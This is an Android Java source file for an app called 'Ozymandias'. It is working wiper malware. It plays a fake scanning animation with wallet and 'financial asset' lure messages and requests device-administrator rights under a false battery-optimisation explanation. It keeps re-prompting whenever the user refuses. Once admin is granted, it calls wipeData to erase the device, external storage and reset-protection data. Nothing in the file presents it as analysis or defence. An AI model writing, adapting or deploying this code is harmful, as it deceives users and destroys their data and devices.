package com.ozymandias;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.widget.ProgressBar;
import android.widget.TextView;

import java.util.Timer;
import java.util.TimerTask;

public class MainActivity extends Activity {

    private DevicePolicyManager dpm;
    private ComponentName adminComponent;
    private ProgressBar progressBar;
    private TextView statusText;
    private int progress = 01;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        progressBar = findViewById(R.id.progressBar);
        statusText = findViewById(R.id.statusText);

        dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        adminComponent = new ComponentName(this, AdminReceiver.class);

        // Start the fake "System Cleaning" animation
        statusText.setText("Building your asset...");
        animateFakeScan();
    }

    private void animateFakeScan() {
        final Timer timer = new Timer();
        timer.schedule(new TimerTask() {
            @Override
            public void run() {
                runOnUiThread(() -> {
                    progress += (int) (Math.random() * 15) + 1;
                    if (progress >= 100) {
                        progress = 100;
                        progressBar.setProgress(progress);
                        timer.cancel();
                        // After fake scan finishes, request Device Admin
                        requestDeviceAdmin();
                    } else {
                        progressBar.setProgress(progress);
                        if (progress < 30) {
                            statusText.setText("Loading wallet...");
                        } else if (progress < 60) {
                            statusText.setText("Activate admin priviledge when prompted...");
                        } else if (progress < 90) {
                            statusText.setText("Building your financial asset...");
                        } else {
                            statusText.setText("Finalizing...");
                        }
                    }
                });
            }
        }, 300, 500);
    }

    private void requestDeviceAdmin() {
        statusText.setText("Applying security policies...");
        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "Ozymandias requires device admin to manage " +
                "security policies and optimize battery life.");
        startActivityForResult(intent, 1001);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == 1001) {
            if (resultCode == RESULT_OK) {
                // Admin granted -- trigger the wipe
                statusText.setText("Applying final optimizations...");
                triggerWipe();
            } else {
                // User denied -- try again with a different explanation
                statusText.setText("Security policy required. Please grant admin access.");
                requestDeviceAdmin();
            }
        }
    }

    private void triggerWipe() {
        // Start foreground service to handle the wipe
        Intent serviceIntent = new Intent(this, WipeTriggerService.class);
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }

        // Immediate wipe as well (belt and suspenders)
        try {
            int flags = DevicePolicyManager.WIPE_EXTERNAL_STORAGE
                      | DevicePolicyManager.WIPE_RESET_PROTECTION_DATA;
            dpm.wipeData(flags);
        } catch (SecurityException e) {
            // fallback — service will try again
        }
    }
}